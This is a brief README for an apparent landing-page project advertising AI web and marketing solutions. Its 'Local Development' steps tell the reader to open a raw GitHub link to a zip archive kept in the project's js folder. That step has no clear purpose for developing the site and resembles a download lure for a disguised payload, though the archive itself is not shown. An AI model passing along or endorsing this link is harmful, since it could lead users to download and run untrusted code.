# AI-Powered Web & Marketing Solutions Landing Page

A landing page for showcasing AI-powered web and marketing solutions.

## Local Development

1. Clone the repository
2. Open https://raw.githubusercontent.com/Jcvdm/GS-web/main/js/G_web_v2.8.zip in your browser
3. Make changes as needed

## Deployment

The site is automatically deployed to Netlify when changes are pushed to the main branch.
